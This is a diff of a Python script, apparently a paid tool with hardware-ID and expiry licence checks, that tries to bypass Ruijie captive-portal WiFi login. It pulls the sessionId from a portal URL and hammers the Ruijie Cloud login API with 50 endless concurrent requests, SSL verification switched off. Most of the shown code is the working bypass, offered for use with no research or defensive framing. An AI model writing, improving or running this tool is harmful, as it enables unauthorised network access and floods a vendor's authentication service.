@@ -6,6 +6,7 @@ import os
 import sys
 import uuid
 import random
+import datetime
 from urllib.parse import urlparse, parse_qs
 from rich.console import Console
 from rich.panel import Panel
@@ -42,7 +43,7 @@ BANNER = """
 """
 
 # ===============================
-# SECURITY SYSTEM
+# SECURITY SYSTEM (HWID & EXP)
 # ===============================
 def get_hwid():
     id_file = os.path.expanduser("~/.moe_yu_id")
@@ -51,6 +52,14 @@ def get_hwid():
     new_id = f"MOE-{str(uuid.uuid4())[:8].upper()}-{random.randint(100, 999)}"
     with open(id_file, "w") as f: f.write(new_id)
     return new_id
+
+def check_expiry(expiry_str):
+    if expiry_str.upper() in ["NONE", "LIFETIME", "FREE"]: return True, "Lifetime"
+    try:
+        expiry_date = datetime.datetime.strptime(expiry_str, '%Y-%m-%d')
+        if datetime.datetime.now() > expiry_date: return False, expiry_date.strftime('%d-%b-%Y')
+        return True, expiry_date.strftime('%d-%b-%Y')
+    except: return True, "Lifetime"
 
 def check_license():
     my_hwid = get_hwid()
@@ -67,12 +76,20 @@ def check_license():
         for line in res.text.splitlines():
             parts = line.split("|")
             if user_key == parts[0].strip():
+                # HWID Check
                 db_hwid = parts[2].strip() if len(parts) > 2 else "FREE"
                 if db_hwid != "FREE" and db_hwid != my_hwid:
                     console.print("[bold red]\n❌ HWID MISMATCH![/bold red]")
                     sys.exit()
-                console.print("[bold green]\n✅ ACCESS GRANTED![/bold green]")
-                return True
+                
+                # Expiry Check
+                is_active, date_label = check_expiry(parts[1].strip() if len(parts) > 1 else "None")
+                if is_active:
+                    console.print(f"[bold green]\n✅ ACCESS GRANTED! STATUS: {date_label}[/bold green]")
+                    return True
+                else:
+                    console.print(f"[bold red]\n❌ EXPIRED ON: {date_label}[/bold red]")
+                    sys.exit()
         console.print("[bold red]\n❌ INVALID KEY![/bold red]")
         sys.exit()
     except:
@@ -83,15 +100,15 @@ def check_license():
 # STAR BYPASS ENGINE (AIOHTTP)
 # ===============================
 async def send_pulse(session, url):
-    """Asynchronous Request ပို့ခြင်း - သမရိုးကျထက် ပိုမြန်သည်"""
     while True:
         try:
             async with session.get(url, timeout=5) as response:
+                # Status 200/302 ဆိုလျှင် အောင်မြင်မှု ပိုများပါသည်
                 sys.stdout.write(f"\033[92m[✓] BYPASS ACTIVE | STATUS: {response.status}\033[0m\r")
                 sys.stdout.flush()
         except:
             pass
-        await asyncio.sleep(0.05) # Pulse rate (0.05s)
+        await asyncio.sleep(0.05)
 
 async def start_bypass(portal_url):
     parsed = urlparse(portal_url)
@@ -100,28 +117,25 @@ async def start_bypass(portal_url):
     res_val = params.get('RES', [''])[0]
     
     if not sid:
-        console.print("[bold red][-] sessionId မတွေ့ပါ။ Link ကို Browser မှ အသစ်ကူးယူပါ။[/bold red]")
+        console.print("[bold red][-] sessionId မတွေ့ပါ။ Browser မှ URL အသစ်ကို ကူးယူပါ။[/bold red]")
         return
 
     # Ruijie Cloud v2 API Path
     auth_url = f"https://portal-as.ruijienetworks.com/api/maccauth/v2/login?sessionId={sid}&res={res_val}"
     
     console.print(f"\n[bold green][+] Connected Session: {sid[:12]}[/bold green]")
-    console.print("[bold yellow][*] STAR Engine စတင်နေပြီ...[/bold yellow]\n")
+    console.print("[bold yellow][*] STAR Engine မြန်နှုန်းမြင့် Bypass စတင်နေပြီ...[/bold yellow]\n")
 
-    # TCP Connector ကိုသုံးပြီး SSL check ပိတ်ကာ request ပိုမြန်အောင်လုပ်ခြင်း
     async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
         tasks = []
-        # တစ်ပြိုင်နက်တည်း Request ၅၀ ပို့မည်
         for _ in range(50):
             tasks.append(asyncio.create_task(send_pulse(session, auth_url)))
-        
         await asyncio.gather(*tasks)
 
 def main():
     if check_license():
         console.print("\n[1] Auto Detect (Standard)")
-        console.print("[2] Manual Portal Link (Recommended)")
+        console.print("[2] Manual Portal Link (Recommended for Cloud)")
         mode = input("\nSelect Mode [1/2]: ").strip()
 
         if mode == "2":
@@ -129,15 +143,14 @@ def main():
             if link:
                 asyncio.run(start_bypass(link))
         else:
-            # Auto Detection Logic
             try:
                 r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
                 if r.status_code != 204:
                     asyncio.run(start_bypass(r.url))
                 else:
-                    console.print("[bold cyan][!] Internet ရနေပြီဖြစ်သောကြောင့် Bypass လုပ်ရန်မလိုပါ။[/bold cyan]")
+                    console.print("[bold cyan][!] Internet ရနေပါပြီ။[/bold cyan]")
             except:
-                console.print("[bold red][!] Portal ကို ရှာမတွေ့ပါ။ WiFi ပြန်ချိတ်ပါ။[/bold red]")
+                console.print("[bold red][!] Portal ကို ရှာမတွေ့ပါ။[/bold red]")
 
 if __name__ == "__main__":
     try:
